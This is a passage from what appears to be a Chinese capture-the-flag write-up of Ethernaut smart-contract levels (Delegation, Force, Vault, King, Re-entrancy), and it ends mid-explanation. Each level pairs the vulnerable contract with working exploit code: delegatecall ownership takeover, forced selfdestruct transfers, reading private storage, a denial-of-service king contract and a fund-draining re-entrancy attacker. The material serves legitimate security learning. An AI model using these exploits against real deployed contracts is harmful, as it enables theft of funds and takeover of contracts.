<td><strong>修改的存储</strong></td>
<td><strong>目标合约 (B) 的数据</strong></td>
<td><strong>发起合约 (A) 的数据</strong></td>
</tr>
<tr>
<td><strong>msg.sender</strong></td>
<td>发起合约 (A)</td>
<td><strong>原始调用者 (User)</strong></td>
</tr>
</tbody></table>
</blockquote>
<p><strong>关卡分析</strong></p>
<blockquote>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p>  Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</li>
<li>Fallback methods</li>
<li>Method ids</li>
</ul>
</blockquote>
<p>这一关会有两个合约：<code>Delegate</code> 和 <code>Delegation</code>。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegate</span> {</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _owner</span>) {</span><br><span class="line">        owner = _owner;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) public {</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegation</span> {</span><br><span class="line">    address public owner;</span><br><span class="line">    <span class="title class_">Delegate</span> delegate;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _delegateAddress</span>) {</span><br><span class="line">        delegate = <span class="title class_">Delegate</span>(_delegateAddress);</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>() external {</span><br><span class="line">        (bool result,) = <span class="title function_">address</span>(delegate).<span class="title function_">delegatecall</span>(msg.<span class="property">data</span>);</span><br><span class="line">        <span class="keyword">if</span> (result) {</span><br><span class="line">            <span class="variable language_">this</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>Delegate 合约 (被借用的代码库):</strong></p>
<p><strong>Delegation 合约 (你要攻击的目标):</strong></p>
<p><strong>漏洞点：</strong></p>
<ol>
<li><code>Delegation</code> 合约有一个 <code>fallback</code> 函数，它会把所有未知的调用都通过 <code>delegatecall</code> 转发给 <code>Delegate</code> 合约。</li>
<li><code>Delegate</code> 合约里有一个 <code>pwn()</code> 函数，代码是 <code>owner = msg.sender</code>。</li>
<li>两个合约的存储布局（Storage Layout）是一样的：第一个变量（Slot 0）都是 <code>owner</code>。</li>
</ol>
<p><strong>攻击逻辑：</strong><br>如果你向 <code>Delegation</code> 合约发起一笔交易，调用一个叫 <code>pwn()</code> 的函数：</p>
<ol>
<li><code>Delegation</code> 发现自己没有 <code>pwn()</code> 函数，于是触发 <code>fallback</code>。</li>
<li><code>fallback</code> 使用 <code>delegatecall</code> 把你的请求转发给 <code>Delegate</code>。</li>
<li><code>Delegate</code> 的 <code>pwn()</code> 代码被执行：<code>owner = msg.sender</code>。</li>
<li>由于是 <code>delegatecall</code>，这行代码修改的是 <strong>Delegation 合约的 owner</strong>。</li>
<li>结果：<code>Delegation</code> 的 Owner 变成了你。</li>
</ol>
<p><strong>exp:</strong></p>
<p><strong>1. 计算函数选择器</strong>：<br><code>pwn()</code> 的哈希值的前 4 个字节。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var pwnSignature = web3.utils.sha3("pwn()").slice(0, 10);</span><br><span class="line">// 结果应该是 "0xdd365b8b"</span><br></pre></td></tr></table></figure></div>

<p><strong>2. 发起攻击交易</strong>：<br>向合约发送这笔带有特殊数据的交易。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.sendTransaction({data: pwnSignature})</span><br></pre></td></tr></table></figure></div>

<p><strong>3. 验证结果</strong>：<br>等待交易确认后，检查 Owner。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.owner()</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2026-01-28_22-30-01.png" alt="nipaste_2026-01-28_22-30-0"></p>
<h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h2><h3 id="selfdestruct-自毁"><a href="#selfdestruct-自毁" class="headerlink" title="selfdestruct (自毁)"></a><code>selfdestruct</code> (自毁)</h3><p>这一关的目标非常简单粗暴：<strong>强行给一个不收钱的合约转账</strong>。</p>
<p>通常情况下，给合约转账需要合约配合：</p>
<ol>
<li>要么有一个 <code>payable</code> 的函数（比如 <code>deposit()</code>）。</li>
<li>要么有一个 <code>receive()</code> 或 <code>fallback()</code> 函数来接收直接转账。</li>
</ol>
<p>如果一个合约是空的（像这一关的合约代码可能就是空的），或者没有这些函数，你直接用 <code>sendTransaction</code> 转账会失败（Revert），因为合约会拒绝接收。</p>
<p><strong>核心漏洞：<code>selfdestruct</code> (自毁)</strong></p>
<p>Solidity 中有一个特殊的命令叫 <code>selfdestruct(address recipient)</code>。</p>
<ul>
<li><strong>作用</strong>：销毁当前合约，把它账上所有的 ETH <strong>强制发送</strong>给指定的 <code>recipient</code> 地址。</li>
<li><strong>强制性</strong>：这种转账是<strong>无法被拒绝的</strong>！无论目标合约有没有 <code>payable</code> 函数，无论它是否想要这笔钱，它都必须收下。</li>
</ul>
<p><strong>关卡分析</strong></p>
<blockquote>
<p>Some contracts will simply not take your money <code>¯\_(ツ)_/¯</code></p>
<p>The goal of this level is to make the balance of the contract greater than zero.</p>
<p>  Things that might help:</p>
<ul>
<li>Fallback methods</li>
<li>Sometimes the best way to attack a contract is with another contract.</li>
<li>See the <a class="link" target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/help">“?” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> page above, section “Beyond the console”</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Force</span> { <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">    /~____  =ø= /</span></span><br><span class="line"><span class="comment">    (______)__m_m)</span></span><br><span class="line"><span class="comment">                   */</span> }</span><br></pre></td></tr></table></figure></div>

<p>需要部署一个“自杀式袭击”合约。</p>
<p><strong>1. 编写攻击合约 (Remix)</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT </span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">ForceAttack</span> {</span><br><span class="line">    <span class="comment">// 1. 构造函数：部署时顺便往里存一点点钱</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) payable {}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 攻击函数：自毁并把钱强行塞给目标</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params">address payable _victim</span>) public {</span><br><span class="line">        <span class="title function_">selfdestruct</span>(_victim);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>2. 部署与执行</strong></p>
<ol>
<li>在 Remix 中编译上述代码。</li>
<li><strong>部署时存钱</strong>：在 Deploy 按钮旁边的 <strong>Value</strong> 框里，填入一点点 ETH（比如 <code>1 Wei</code> 或 <code>0.0001 Ether</code>）。这一步很重要，因为我们要送钱过去，首先自己得有钱。</li>
<li>点击 <strong>Deploy</strong>。</li>
<li>部署成功后，调用 <code>attack</code> 函数，参数填入 Ethernaut 给你的关卡实例地址。</li>
<li>点击 <strong>transact</strong>。</li>
</ol>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2026-01-28_22-44-45.png" alt="nipaste_2026-01-28_22-44-4"></p>
<h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h2><h3 id="private变量可读"><a href="#private变量可读" class="headerlink" title="private变量可读"></a><code>private</code>变量可读</h3><p>这一关的核心知识点是：<strong>区块链上没有秘密</strong>。</p>
<blockquote>
<p>Unlock the vault to pass the level!</p>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Vault</span> {</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">bytes32 _password</span>) {</span><br><span class="line">        locked = <span class="literal">true</span>;</span><br><span class="line">        password = _password;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes32 _password</span>) public {</span><br><span class="line">        <span class="keyword">if</span> (password == _password) {</span><br><span class="line">            locked = <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><strong>误区解析</strong></p>
<p>很多新手看到 <code>private</code> 关键字：</p>
<p>会下意识地认为：“这个变量是私有的，外部无法访问，所以密码是安全的。”</p>
<p>在 Solidity 中，<code>private</code> 仅仅意味着<strong>其他智能合约</strong>无法直接读取这个变量。但是，对于<strong>区块链网络上的所有节点和观察者</strong>来说，所有数据都是公开透明的。</p>
<p>所有的数据都存储在合约的 <strong>Storage Slots（存储槽）</strong> 里，我们可以直接通过 Web3.js 读取这些存储槽的内容。</p>
<p><strong>存储槽分析 (Storage Layout)</strong></p>
<p>Solidity 的状态变量是按顺序存储在 Slot 里的，每个 Slot 有 32 字节（256位）。</p>
<ol>
<li><p>Slot 0</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool public locked;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>bool</code> 类型只占 1 个字节。</li>
<li>它会被放在 Slot 0 的最右边。</li>
</ul>
</li>
<li><p>Slot 1</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 private password;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>bytes32</code> 刚好占满 32 个字节。</li>
<li>因为 Slot 0 剩下的空间不够放 32 字节，所以 <code>password</code> 会被放到下一个槽，也就是 <strong>Slot 1</strong>。</li>
</ul>
</li>
</ol>
<p><strong>结论：密码就明文存放在 Slot 1 里。</strong></p>
<p><strong>通关步骤</strong></p>
<p>不需要写合约，直接在浏览器控制台操作。</p>
<p><strong>1. 读取密码</strong></p>
<p>我们需要读取合约地址在 Slot 1 处的数据。</p>
<p>在控制台输入：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// web3.eth.getStorageAt(合约地址, Slot编号)</span><br><span class="line">var password = await web3.eth.getStorageAt(contract.address, 1);</span><br></pre></td></tr></table></figure></div>

<p>输入 <code>password</code> 查看结果，你应该能看到一个 <code>0x</code> 开头的长字符串。这就是密码。</p>
<p><strong>2. 解锁合约</strong></p>
<p>调用 <code>unlock</code> 函数，把刚才读到的密码传进去。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.unlock(password);</span><br></pre></td></tr></table></figure></div>

<p><strong>3. 验证与提交</strong></p>
<p>等待交易确认后，检查是否解锁：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">await contract.locked()</span><br><span class="line">// 应该返回 false</span><br></pre></td></tr></table></figure></div>

<p>如果返回 <code>false</code>，点击 <strong>“Submit instance”</strong> 通关。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-12_12-05-45.png" alt="nipaste_2025-12-12_12-05-4"></p>
<h2 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h2><h3 id="transfer-函数-拒绝转账"><a href="#transfer-函数-拒绝转账" class="headerlink" title="transfer 函数 & 拒绝转账"></a><code>transfer</code> 函数 &amp; 拒绝转账</h3><p>这个关卡的目标是打破 <code>King</code> 合约，阻止关卡（level）重新夺回“国王”的宝座。</p>
<p>漏洞在于这一行代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payable(king).transfer(msg.value);</span><br></pre></td></tr></table></figure></div>

<p><code>transfer</code> 函数有一个特性：如果接收方是一个智能合约，且该合约没有实现 <code>receive</code> 或 <code>fallback</code> 函数（或者这些函数执行失败），那么转账就会失败并回滚（revert）。如果转账回滚，整个交易都会回滚，这意味着没有人能够取代当前的国王。</p>
<p><strong>解决方案：<code>BadKing</code> 合约</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">King</span> {</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) payable {</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">        king = msg.<span class="property">sender</span>;</span><br><span class="line">        prize = msg.<span class="property">value</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= prize || msg.<span class="property">sender</span> == owner);</span><br><span class="line">        <span class="title function_">payable</span>(king).<span class="title function_">transfer</span>(msg.<span class="property">value</span>);</span><br><span class="line">        king = msg.<span class="property">sender</span>;</span><br><span class="line">        prize = msg.<span class="property">value</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_king</span>(<span class="params"></span>) public view returns (address) {</span><br><span class="line">        <span class="keyword">return</span> king;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p><code>BadKing</code> 合约的设计思路如下：</p>
<ol>
<li><strong>成为国王</strong>：在构造函数中发送足够的以太币给 <code>King</code> 合约，从而成为新的国王。</li>
<li><strong>拒绝接收以太币</strong>：故意不实现 <code>receive</code> 或 <code>fallback</code> 函数。</li>
</ol>
<p>当关卡（或者其他任何人）试图成为新国王时，<code>King</code> 合约会尝试把当前的奖金（prize）发送给 <code>BadKing</code>。由于 <code>BadKing</code> 无法接收以太币，转账会失败，导致交易回滚。因此，<code>BadKing</code> 将永远占据国王的位置。</p>
<p>这是我创建的攻击合约代码：</p>
<p><strong>如何使用：</strong></p>
<ol>
<li><p>检查 <code>King</code> 合约当前的 <code>prize</code>（奖金）是多少。</p>
</li>
<li><p>部署 <code>BadKing</code> 合约，部署时附带的 <code>msg.value</code> 要稍微高于当前的 <code>prize</code>，并将 <code>King</code> 合约的地址作为参数传入构造函数。</p>
</li>
<li><p>提交实例。关卡将无法夺回国王的宝座，你将赢得胜利。</p>
</li>
</ol>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">BadKing</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _king</span>) payable {</span><br><span class="line">        <span class="comment">// Send ETH to the King contract to become the new king.</span></span><br><span class="line">        <span class="comment">// The amount sent (msg.value) must be &gt;= current prize.</span></span><br><span class="line">        (bool success, ) = _king.<span class="property">call</span>{<span class="attr">value</span>: msg.<span class="property">value</span>}(<span class="string">""</span>);</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">"Failed to become king"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No receive() or fallback() function is defined.</span></span><br><span class="line">    <span class="comment">// Therefore, this contract cannot receive Ether via .transfer() or .send().</span></span><br><span class="line">    <span class="comment">// When the King contract tries to send Ether back to this contract (when a new king tries to take over),</span></span><br><span class="line">    <span class="comment">// the transfer will fail and revert the transaction.</span></span><br><span class="line">    <span class="comment">// This prevents anyone else from becoming the king.</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-13_12-27-41.png" alt="nipaste_2025-12-13_12-27-4"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-13_12-27-52.png" alt="nipaste_2025-12-13_12-27-5"></p>
<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h2><blockquote>
<p>The goal of this level is for you to steal all the funds from the contract.</p>
<p>  Things that might help:</p>
<ul>
<li>Untrusted contracts can execute code where you least expect it.</li>
<li>Fallback methods</li>
<li>Throw/revert bubbling</li>
<li>Sometimes the best way to attack a contract is with another contract.</li>
<li>See the <a class="link" target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/help">“?” <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> page above, section “Beyond the console”</li>
</ul>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"openzeppelin-contracts-06/math/SafeMath.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Reentrance</span> {</span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">address _to</span>) public payable {</span><br><span class="line">        balances[_to] = balances[_to].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _who</span>) public view returns (uint256 balance) {</span><br><span class="line">        <span class="keyword">return</span> balances[_who];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 _amount</span>) public {</span><br><span class="line">        <span class="keyword">if</span> (balances[msg.<span class="property">sender</span>] &gt;= _amount) {</span><br><span class="line">            (bool result,) = msg.<span class="property">sender</span>.<span class="property">call</span>{<span class="attr">value</span>: _amount}(<span class="string">""</span>);</span><br><span class="line">            <span class="keyword">if</span> (result) {</span><br><span class="line">                _amount;</span><br><span class="line">            }</span><br><span class="line">            balances[msg.<span class="property">sender</span>] -= _amount;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable {}</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个关卡的漏洞位于 <code>Reentrance</code> 合约的 <code>withdraw</code> 函数中。它在更新用户余额（<code>balances[msg.sender] -= _amount</code>）<strong>之前</strong>，就执行了外部调用（<code>msg.sender.call</code>）发送以太币。</p>
<p>这使得攻击者可以在余额被扣除之前，通过回调函数（<code>receive</code> 或 <code>fallback</code>）再次调用 <code>withdraw</code> 函数，从而反复提取资金。</p>
<p><strong>ReentranceAttack</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义目标合约的接口，而不是直接导入旧代码</span></span><br><span class="line"><span class="comment">// 这样可以避免编译器版本冲突和依赖问题</span></span><br><span class="line">interface <span class="title class_">IReentrance</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">address _to</span>) external payable;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 _amount</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _who</span>) external view returns (uint256 balance);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">ReentranceAttack</span> {</span><br><span class="line">    <span class="title class_">IReentrance</span> public target;</span><br><span class="line">    uint256 public amount;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _target</span>) {</span><br><span class="line">        target = <span class="title class_">IReentrance</span>(_target);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) external payable {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span>, <span class="string">"Need ETH to attack"</span>);</span><br><span class="line">        amount = msg.<span class="property">value</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1. 捐赠给目标合约以增加我们的余额记录</span></span><br><span class="line">        target.<span class="property">donate</span>{<span class="attr">value</span>: amount}(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 提款以触发重入</span></span><br><span class="line">        target.<span class="title function_">withdraw</span>(amount);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable {</span><br><span class="line">        <span class="comment">// 3. 如果目标合约还有钱，就再次重入</span></span><br><span class="line">        uint256 targetBalance = <span class="title function_">address</span>(target).<span class="property">balance</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetBalance &gt; <span class="number">0</span>) {</span><br><span class="line">            uint256 toWithdraw = amount;</span><br><span class="line">            <span class="keyword">if</span> (targetBalance &lt; amount) {</span><br><span class="line">                toWithdraw = targetBalance;</span><br><span class="line">            }</span><br><span class="line">            target.<span class="title function_">withdraw</span>(toWithdraw);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>结合代码逐行拆解这个攻击脚本，看看它是如何一步步掏空目标合约的。</p>
<p><strong>核心逻辑：利用“时间差”</strong></p>
<p>攻击的核心在于利用目标合约的一个逻辑漏洞：<strong>它先给钱，后记账</strong>。<br>这就好比你去银行取钱，柜员先把现金递给你，然后再低头去电脑上扣你的余额。如果你手够快，在柜员低头之前，又喊了一句“我要取钱”，柜员看电脑上余额还没扣，就又给你拿了一笔钱。</p>
<p><strong>1. 准备阶段 (<code>constructor</code>)</strong></p>
<ul>
<li><strong>作用</strong>：部署攻击合约时，锁定受害者（目标合约）的地址。</li>
</ul>
<p><strong>2. 发起攻击 (<code>attack</code> 函数)</strong></p>
<p>这是攻击的入口点，由你（黑客）手动调用。</p>
<ul>
<li>存入诱饵 (<code>donate</code>)：<ul>
<li>目标合约有一个检查：<code>if (balances[msg.sender] &gt;= _amount)</code>。</li>
<li>为了能提款，我们必须先在目标合约里有存款。所以我们先“假装”是个好人，存入一笔钱（比如 1 ETH）。</li>
</ul>
</li>
<li>开始提款 (<code>withdraw</code>)：<ul>
<li>我们立即要求把这 1 ETH 取出来。</li>
<li>目标合约收到请求，检查余额充足，于是执行 <code>msg.sender.call{value: _amount}("")</code> 把钱转回来。</li>
